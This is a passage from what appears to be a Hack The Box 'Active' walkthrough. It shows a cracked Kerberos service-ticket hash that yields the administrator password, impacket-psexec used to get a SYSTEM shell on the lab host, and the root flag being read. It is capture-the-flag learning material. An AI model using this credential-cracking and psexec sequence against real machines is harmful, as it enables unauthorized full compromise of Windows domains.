- The password for administrator turns out to be `Ticketmaster1968`

```
┌──(kali㉿kali)-[~/HTB/machines/active]
└─$ cat cracked.txt                                                                                                                 
$krb5tgs$23$...............:Ticketmaster1968
```

### Using psexec to get SYSTEM shell

```
┌──(kali㉿kali)-[~/HTB/machines/active]
└─$ impacket-psexec administrator@10.10.10.100                                                                          
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file qnqqhaQQ.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service YEYh on 10.10.10.100.....
[*] Starting service YEYh.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

- Root flag done!

```
C:\Windows\system32>cd c:\Users\Administrator\Desktop

c:\Users\Administrator\Desktop>type root.txt
b5fc76d1d6b91d77b2fbf2d54d0f708b
```